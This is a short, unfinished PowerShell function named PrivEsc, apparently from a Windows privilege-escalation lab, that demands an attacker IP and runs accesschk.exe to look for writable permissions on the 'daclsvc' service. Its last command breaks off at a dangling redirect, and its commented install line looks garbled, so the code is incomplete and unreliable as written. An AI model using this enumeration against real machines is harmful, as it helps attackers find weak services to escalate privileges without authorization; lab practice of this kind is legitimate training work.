function PrivEsc

<#  cd $home/Desktop/sysinternals
    Find-Package -Name sysinternals | Install-Package sysinternals -scope CurrentUser -force C:\Windows\Temp
#>
{
      [cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP
    )


  if ($AttackerIP)
  {
    write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Installing SysInternals on current user"
    mkdir C:\Windows\Temp
    cd C:\PrivEsc\
    .\accesschk.exe /accepteula -uwcqv user daclsvc > 

  }
    

  else {
    echo "Need Attacker IP"
  }
}